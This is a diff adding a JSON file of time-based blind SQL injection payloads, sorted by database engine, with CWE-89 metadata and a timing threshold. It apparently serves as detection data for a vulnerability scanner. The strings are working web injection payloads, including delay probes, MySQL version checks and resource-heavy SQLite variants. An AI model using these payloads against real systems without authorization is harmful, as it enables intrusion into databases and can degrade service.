@@ -1,0 +1,16 @@
+{
+  "variants": {
+    "mysql": ["' AND SLEEP(5)-- -", "' AND SLEEP(10)-- -", "' AND IF(1=1,SLEEP(5),0)-- -", "' AND IF(SUBSTRING(@@version,1,1)=5,SLEEP(5),0)-- -", "' AND IF(SUBSTRING(@@version,1,1)=8,SLEEP(5),0)-- -", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", "1' AND SLEEP(5)-- -", "1) AND SLEEP(5)-- -"],
+    "postgresql": ["'; SELECT pg_sleep(5)-- -", "'; SELECT pg_sleep(10)-- -", "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)-- -", "1; SELECT pg_sleep(5)-- -"],
+    "mssql": ["'; WAITFOR DELAY '0:0:5'-- -", "'; WAITFOR DELAY '0:0:10'-- -", "'; IF (1=1) WAITFOR DELAY '0:0:5'-- -", "1; WAITFOR DELAY '0:0:5'-- -"],
+    "oracle": ["' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',10)-- -", "' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM dual)-- -"],
+    "sqlite": ["' AND randomblob(100000000)-- -", "1 AND LIKE('ABCDEFG',UPPER(HEX(randomblob(100000000/2))))-- -", "1 AND randomblob(100000000/2)-- -"]
+  },
+  "payloads": ["' AND SLEEP(5)-- -", "' AND SLEEP(10)-- -", "'; WAITFOR DELAY '0:0:5'-- -", "'; SELECT pg_sleep(5)-- -", "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -"],
+  "markers": [],
+  "metadata": {
+    "cwe": "CWE-89",
+    "technique": "Time-based blind SQL injection",
+    "threshold_ms": 2000
+  }
+}
